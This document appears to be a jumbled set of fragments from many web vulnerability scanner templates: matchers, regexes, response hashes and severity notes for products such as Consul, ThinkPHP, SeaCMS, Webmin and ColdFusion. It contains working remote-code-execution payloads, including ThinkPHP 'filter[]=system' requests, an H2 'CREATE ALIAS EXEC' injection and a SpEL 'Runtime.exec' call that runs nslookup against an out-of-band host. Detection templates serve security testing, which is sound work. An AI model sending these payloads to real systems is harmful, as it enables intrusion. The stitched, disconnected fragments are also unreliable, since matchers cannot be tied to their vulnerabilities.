...
- part - body
- words
  1. "spring.datasource.hikari.connection-test-query":"CREATE ALIAS EXEC AS CONCAT
...
- {{BaseURL}}/search.php?searchtype=5
  - searchtype=5&order=}{end if} {if:1)echo md5('seacms');if(1}{end if}
...
- part - body
- words
  1. b1e597fa44dfd7669966bfab04eeb8ea
...
- part - body
- words
  1. \<h1>500 Server Internal Error
...
- regex
  1. Volume (in drive [A-Z]|Serial Number) is
- part - body
...
- part - body
- words
  1. 38ee63071a04dc5e04ed22624c38e648
...
- Hashicorp Consul Services API is vulnerable to an attack that can be leveraged to gaino remote command execution on Consul nodes.
- severity - critical
...
- words
  1. c5b3d7397a90f42d222f7ed9408c0dc6
- part - body
...
# Inspur Clusterengine V4 SYSshell RCE
...
- words
  1. d9b2c63a497e2f30c4ad9ad083a00691
...
- dsl
  1. contains(body_2, "PHP Extension")
  2. contains(body_2, "PHP Version")
  3. status_code_2 == 200
- condition - and
...
- {{BaseURL}}/?s=index/index/index
  - s=echo%20thinkphp%20%7C%20rev&\_method=\_\_construct&method&filter[]=system
...
- {{BaseURL}}/index.php?s=captcha
  - \_method=\_\_construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1
...
- words
  1. \<title>Error: Unable to display RD Web Access\</title>
...
- words
  1. \<title>Forcepoint Appliance\</title>
...
- part - body
- regex
  1. Version&[a-zA-Z][a-za-z][a-zA-Z][a-za-z];[0-9]+\.[0-9]
...
- TiDB queries with enabled native password support are susceptible to password brute-force attacks.
- severity - info
...
- An exposed Android debug bridge was discovered.
- severity - critical
...
- dsl
  1. contains(body, "$show_input = function($info)")
  2. contains(body, "$strip_slashes($host)")
  3. contains(body, "Log Helper")
  4. status_code == 200
- condition - and
...
- eYouMail is susceptible to a remote code execution vulnerability.
- severity - critical
...
- {{BaseURL}}/s=set&\_method=\_\_construct&method=\*&filter[]=system
...
- dsl
  1. status_code_2 == 200
  2. contains(body_1, "htmoffice operate")
  3. contains(body_2, "Windows IP")
- condition - and
...
- dsl
  1. status_code_1==200
  2. status_code_2==200
  3. contains(body_1, 'verify_string')
  4. contains(body_2, 'Windows IP')
- condition - and
...
- regex
  1. LISTSERV Maestro\s+9\.0-[123456780]
  2. LISTSERV Maestro\s+[5678]
  3. Administration Hub 9\.0-[123456780]
  4. Administration Hub [5678]
...
- dsl
  1. compare_versions(version, '\< 5.4', '>= 5.1')
...
- part - body
- words
  1. 6ca86c2c17047c14437f55c42c801c10
...
- words
  1. total
  2. An internal server error occurred.
- condition - and
...
- part - body
- words
  1. HttpUcmdbServiceProviderFactoryImpl
  2. ServerVersion=11.6.0
- condition - and
...
- part - body
- regex
  1. 15\.0\.0\.(4571|5275|4351|5056)
  2. 16\.0\.0\.(10337|10364|10366)
- condition - or
...
- part - header
- regex
  1. (?i)(Microsoftsharepointteamservices:)
...
- words
  1. ajax_ccea.php
  2. ajax_getemailingactions.php
  3. ajax_getemailtemplates.php
- condition - and
...
- words
  1. wp-login.php?checkemail=confirm
- part - header
...
- part - body
- words
  1. Unsupported response types: [978015547]
...
- words
  1. Configuration has been altered
- part - body
...
- words
  1. 26ec00a3a03f6bfc5226fd121567bb58
...
- group - 1
- regex
  1. \<keyStoreItem>\<id>([0-9]+)\</id>\<name>{{randstr}}
...
# AudioCode 420HD - Remote Code Execution
...
- part - body
- words
  1. 4cc32a3a81d2bb37271934a48ce4468a
...
- part - body
- words
  1. Failed to retrieve RMIServer stub: javax.naming.CommunicationException: 127.0.0.1:1389
...
- dsl
  1. contains(body, 'c3959e8a43f1b39b0d1255961685a238')
  2. status_code==200
- condition - and
...
- {{BaseURL}}/hystrix/;a=a/**${T (java.lang.Runtime).getRuntime().exec("nslookup {{interactsh-url}}")}**::.x/
...
- dsl
  1. status_code_1 == 200
  2. contains(body_1, "CVE-2019-2729-POC")
- condition - and
...
- dsl
  1. contains(body_1, "Reports Servlet")
...
- words
  1. foo was passed in via Airflow CLI Test command with value {{ params.foo }}
...
- words
  1. function onInit()
  2. phpinfo()
  3. Safe mode is currently enabled. Editing the PHP code of CMS templates is disabled. To disable safe mode, set the `cms.enableSafeMode` configuration value to `false`.
- condition - and
...
- attribute - value
- xpath
  1. /html/body/div[1]/div/div[2]/div/div/form/input[1]
- internal - True
...
- attribute - value
- xpath
  1. /html/body/div[1]/div/div[2]/div/div/form/input[2]
- internal - True
...
- group - 1
- regex
  1. \<input\stype=\\"hidden\\"\svalue=\\"demo\\"\sname=\\"([^"]\*)\\"
- internal - True
...
- severity - critical
- tags - cve,cve2022,ssti,rce,ejs,nodejs,oast
...
# Webmin prior to 1.990 - Improper Access Control to Remote Code Execution
...
- part - body
- words
  1. Failed to write to /{{ranstr}}/index.html
...
- words
  1. Rails.root:
  2. Action Controller: Exception caught
- condition - and
...
- Adobe ColdFusion is susceptible to remote code execution. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
- severity - medium
